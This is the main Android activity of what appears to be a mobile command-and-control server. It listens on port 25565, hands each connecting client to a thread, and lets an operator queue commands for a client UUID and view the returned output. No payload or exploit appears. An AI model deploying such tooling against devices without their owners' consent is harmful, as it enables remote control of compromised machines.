package c2.mobile.mobilec2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentValues;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    /**
     * Called when the activity is first created.
     */
    private static final String TAG = "ServerSocketTest";
    private CommandDatabase commandDatabase;

    Runnable conn = new Runnable() {
        public void run() {
            try {
                ServerSocket server = new ServerSocket(25565);
                while (true) {
                    Socket socket = server.accept();
                    new C2ClientThread(socket, commandDatabase).start();
                }
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
            }
        }
    };

    @Override
    protected void onCreate (Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new Thread(conn).start();
        commandDatabase = new CommandDatabase(getApplicationContext());
    }

    public void addCommandToDatabase(View v) {
        EditText command = (EditText) findViewById(R.id.command);
        EditText uuidEditText = (EditText) findViewById(R.id.uuidEditText);

        String cmd = command.getText().toString();
        String uuid = uuidEditText.getText().toString();

        commandDatabase.updateDatabase(uuid, cmd, "");
    }

    public void viewOutput (View v) {
        EditText uuidEditText = (EditText) findViewById(R.id.uuidEditText);
        String uuid = uuidEditText.getText().toString();

        Intent i = new Intent(this, DisplayOutput.class);
        Log.e("UUID: ", uuid);
        i.putExtra("uuid", uuid);
        startActivity(i);
    }
}